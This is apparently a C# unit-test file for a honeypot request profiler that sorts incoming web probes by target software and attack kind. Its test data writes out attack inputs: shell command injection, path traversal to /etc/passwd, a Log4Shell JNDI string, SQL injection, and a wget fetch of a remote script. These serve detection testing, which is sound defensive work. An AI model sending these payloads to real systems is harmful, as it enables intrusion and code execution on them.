using Honeyslop.Worker.Llm;

namespace Honeyslop.Worker.Tests.Llm;

[TestClass]
public sealed class RequestProfilerTests
{
    [TestMethod]
    [DataRow("vorobalek.dev", "/", ResponseKind.Site, "the home page of the website vorobalek.dev, served by {server}")]
    [DataRow("203.0.113.7", "/", ResponseKind.Site, "the default page of a freshly installed web server at 203.0.113.7, served by {server}")]
    [DataRow("shop.test", "/catalog/shoes?page=2", ResponseKind.Site, "the page /catalog/shoes of the website shop.test, served by {server}")]
    [DataRow("203.0.113.7", "/HNAP1/", ResponseKind.Device, "D-Link DIR-series home router, HNAP interface")]
    [DataRow("203.0.113.7", "/ISAPI/System/deviceInfo", ResponseKind.Device, "Hikvision IP camera, ISAPI interface")]
    [DataRow("203.0.113.7", "/cgi-bin/status.cgi", ResponseKind.Device, "embedded Linux device with a CGI web interface")]
    [DataRow("203.0.113.7", "/boaform/admin/formLogin", ResponseKind.App, "Realtek-based home router on the Boa web server")]
    [DataRow("blog.test", "/wp-login.php", ResponseKind.App, "WordPress 5")]
    [DataRow("blog.test", "/wp-content/plugins/hellopress/wp_filemanager.php", ResponseKind.App, "WordPress plugin hellopress")]
    [DataRow("blog.test", "/wp-admin/install.php", ResponseKind.App, "WordPress installer, first step")]
    [DataRow("db.test", "/phpmyadmin/index.php", ResponseKind.App, "phpMyAdmin 4")]
    [DataRow("shop.test", "/admin", ResponseKind.App, "the login page of the website shop.test, served by {server}")]
    [DataRow("api.test", "/actuator/env", ResponseKind.Api, "Spring Boot Actuator")]
    [DataRow("203.0.113.7", "/v2/_catalog", ResponseKind.Api, "Docker Registry HTTP API v2")]
    [DataRow("shop.test", "/api/orders/7", ResponseKind.Api, "the JSON API of the website shop.test, served by {server}")]
    [DataRow("shop.test", "/.env", ResponseKind.File, "the file /.env on the website shop.test, served by {server}")]
    [DataRow("shop.test", "/.git/config", ResponseKind.File, "the file /.git/config on the website shop.test, served by {server}")]
    [DataRow("shop.test", "/backup/db.sql", ResponseKind.File, "the file /backup/db.sql on the website shop.test, served by {server}")]
    [DataRow("203.0.113.7", "/cgi-bin/.env", ResponseKind.File, "the file /cgi-bin/.env on the web server at 203.0.113.7, served by {server}")]
    [DataRow("203.0.113.7", "/adminer/.env", ResponseKind.File, "the file /adminer/.env on the web server at 203.0.113.7, served by {server}")]
    [DataRow("blog.test", "/wp-config.php.bak", ResponseKind.File, "the file /wp-config.php.bak on the website blog.test, served by {server}")]
    [DataRow("203.0.113.7", "/cgi-bin/ping.cgi?host=1;id", ResponseKind.Exploit, "embedded Linux device with a CGI web interface, where the injected shell command succeeds")]
    [DataRow("shop.test", "/download?file=../../etc/passwd", ResponseKind.Exploit, "the website shop.test, served by {server}, where the path traversal that reads a file succeeds")]
    [DataRow("shop.test", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F1.2.3.4%2Fa%7D", ResponseKind.Exploit, "the website shop.test, served by {server}, where the JNDI lookup injected into a logged value succeeds")]
    public void Profile_NamesTheKindAndTheSoftware(string host, string target, ResponseKind kind, string subject)
    {
        var server = RequestProfiler.ServerFor(host);
        var expected = subject.Replace("{server}", server);
        Assert.AreEqual(new RequestProfile(kind, expected), RequestProfiler.Profile(host, target, null));
    }

    [TestMethod]
    [DataRow("/sqli?id=1' or '1'='1", "the SQL injection")]
    [DataRow("/index.php?page=php://input", "the injected PHP code")]
    [DataRow("/run?cmd=whoami", "the injected shell command")]
    public void Profile_NamesTheExploit(string target, string exploit)
    {
        StringAssert.EndsWith(RequestProfiler.Profile("shop.test", target, null).Subject, $", where {exploit} succeeds");
    }

    [TestMethod]
    public void ServerFor_KeepsAHostOnOneServer_AndSpreadsHostsOverMany()
    {
        string[] servers = [.. Enumerable.Range(0, 200).Select(x => RequestProfiler.ServerFor($"site{x}.test"))];

        Assert.AreEqual(RequestProfiler.ServerFor("Shop.Test"), RequestProfiler.ServerFor("shop.test"));
        Assert.IsGreaterThan(14, servers.Distinct().Count());
        Assert.IsLessThan(40, servers.GroupBy(x => x).Max(x => x.Count()));
    }

    [TestMethod]
    public void Profile_InjectionInTheBody_IsAnExploit()
    {
        var profile = RequestProfiler.Profile("203.0.113.7", "/boaform/admin/formPing", "target_addr=;wget http://1.2.3.4/x.sh");

        Assert.AreEqual(new RequestProfile(ResponseKind.Exploit, "Realtek-based home router on the Boa web server, where the injected shell command succeeds"), profile);
    }
}